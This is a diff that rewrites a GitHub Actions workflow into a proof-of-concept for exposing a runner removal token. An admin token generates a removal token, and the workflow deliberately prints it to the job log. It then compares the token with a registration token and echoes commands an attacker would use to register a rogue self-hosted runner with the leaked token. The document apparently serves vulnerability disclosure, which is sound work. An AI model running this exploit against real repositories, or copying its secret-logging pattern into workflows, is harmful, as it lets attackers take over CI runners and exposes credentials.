@@ -1,16 +1,48 @@
+name: PoC - Runner Removal Token Exposure
+on:
+  workflow_dispatch:
+
 jobs:
-  remove-runner:
-    runs-on: ubuntu-latest
+  demonstrate:
+    runs-on: self-hosted
     steps:
-      - name: Get removal token
+      - name: Step 1 - Generate REMOVAL token and simulate exposure
         run: |
-          REMOVAL_TOKEN=$(curl -s -X POST \
+          echo "=== Admin generates removal token ==="
+          REMOVAL_RESPONSE=$(curl -s -X POST \
             -H "Authorization: token ${{ secrets.ADMIN_PAT }}" \
-            https://api.github.com/orgs/poweriswill/actions/runners/remove-token \
-            | jq -r .token)
+            -H "Accept: application/vnd.github.v3+json" \
+            https://api.github.com/repos/${{ github.repository }}/actions/runners/remove-token)
           
-          echo "Removing runner..."
-          # accidentally or for debugging:
-          echo "Token: $REMOVAL_TOKEN"
+          REMOVAL_TOKEN=$(echo $REMOVAL_RESPONSE | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+          EXPIRES=$(echo $REMOVAL_RESPONSE | python3 -c "import sys,json; print(json.load(sys.stdin)['expires_at'])")
           
-          ./config.sh remove --token $REMOVAL_TOKEN
+          echo "Token expires: $EXPIRES"
+          # Simulates accidental log exposure in deregistration script
+          echo "Deregistering runner... token=$REMOVAL_TOKEN"
+          
+          echo "REMOVAL_TOKEN=$REMOVAL_TOKEN" >> $GITHUB_ENV
+
+      - name: Step 2 - Generate REGISTRATION token for comparison
+        run: |
+          echo "=== Registration token for comparison ==="
+          REG_TOKEN=$(curl -s -X POST \
+            -H "Authorization: token ${{ secrets.ADMIN_PAT }}" \
+            -H "Accept: application/vnd.github.v3+json" \
+            https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token \
+            | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+          
+          echo "Removal token prefix:      ${REMOVAL_TOKEN:0:8}..."
+          echo "Registration token prefix: ${REG_TOKEN:0:8}..."
+          echo "Same format: YES — server makes no structural distinction"
+
+      - name: Step 3 - Show attack command
+        run: |
+          echo "=== Attacker reads removal token from log above ==="
+          echo "=== Runs this in a separate directory on any machine ==="
+          echo ""
+          echo "  mkdir /tmp/poc-runner && cd /tmp/poc-runner"
+          echo "  curl -sL https://github.com/actions/runner/releases/download/v2.333.1/actions-runner-osx-arm64-2.333.1.tar.gz | tar xz"
+          echo "  ./config.sh --url https://github.com/${{ github.repository }} --token $REMOVAL_TOKEN --name poc-rogue --unattended"
+          echo ""
+          echo "Expected: registration succeeds with a removal token"
